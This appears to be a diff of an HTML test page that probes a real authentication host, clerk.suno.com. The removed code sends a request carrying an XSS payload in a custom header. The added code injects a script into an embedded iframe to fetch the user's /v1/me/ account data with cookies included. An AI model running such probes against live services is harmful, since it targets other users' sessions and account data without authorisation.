@@ -1,37 +1,42 @@
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fetch Example</title>
+    <title>Fetch from Iframe</title>
 </head>
 <body>
-    <h1>Fetch Example</h1>
+    <iframe id="exampleIframe" src="https://clerk.suno.com/" width="600" height="400"></iframe>
+
     <script>
+        const iframe = document.getElementById('exampleIframe');
 
-function gotcha() { location=url }
-var req = new XMLHttpRequest();
-url = 'https://clerk.suno.com'; // Note: Be cautious of mixed content blocking for HTTP sites
-req.onload = gotcha;
-req.open('get', url, true);
-req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
-req.send();
+        // Проверяем готовность iframes
+        iframe.onload = function() {
+            // Это функционал, выполняемый внутри iframe
+            const innerDoc = iframe.contentDocument;
+            const script = innerDoc.createElement('script');
 
+            script.textContent = `
+                fetch('https://clerk.suno.com/v1/me/', {
+                    method: 'GET',
+                    credentials: 'include' // Для отправки cookies, если это необходимо
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+                .then(data => console.log(data))
+                .catch(error => console.error('Ошибка:', error));
+            `;
+
+            innerDoc.body.appendChild(script);
+        };
+
+        // Замените `about:blank` на нужный URL для проверки функциональности
+        iframe.src = 'https://clerk.suno.com/';
     </script>
-
-    <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Embed with Iframe</title>
-</head>
-<body>
-    <iframe src="https://clerk.suno.com" width="600" height="400" style="border:none;">
-    Your browser does not support iframes.
-</iframe>
-    
-
-</body>
-</html>
 </body>
 </html>
